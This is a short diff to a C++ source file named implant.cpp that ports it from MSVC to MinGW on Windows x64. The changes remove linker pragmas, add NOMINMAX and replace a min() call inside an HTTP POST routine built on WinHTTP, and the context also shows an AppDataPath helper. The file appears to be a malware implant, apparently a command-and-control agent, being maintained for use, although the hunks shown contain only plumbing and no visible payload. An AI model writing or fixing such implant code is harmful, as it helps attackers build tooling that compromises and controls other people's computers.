@@ -1,13 +1,12 @@
-// language: C++, file: implant.cpp, target: Windows 11 x64, MSVC
+// language: C++, file: implant.cpp, target: Windows x64, MinGW
+#define NOMINMAX
 #include <windows.h>
 #include <winhttp.h>
 #include <shlobj.h>
 #include <string>
 #include <sstream>
 #include <random>
-#pragma comment(lib, "winhttp.lib")
-#pragma comment(lib, "shell32.lib")
-#pragma comment(lib, "advapi32.lib")
+#include <algorithm>
 
 static std::string AppDataPath() {
     char p[MAX_PATH]{};
@@ -193,7 +192,8 @@ static std::string HttpPost(const Config& c, const std::wstring& path,
     std::string resp; DWORD avail, got; char buf[4096];
     do {
         if (!WinHttpQueryDataAvailable(req, &avail) || !avail) break;
-        if (!WinHttpReadData(req, buf, min(avail, sizeof(buf)), &got)) break;
+        DWORD chunk = (avail < sizeof(buf)) ? avail : (DWORD)sizeof(buf);
+        if (!WinHttpReadData(req, buf, chunk, &got)) break;
         resp.append(buf, got);
     } while (got);
     WinHttpCloseHandle(req); WinHttpCloseHandle(conn); WinHttpCloseHandle(s);
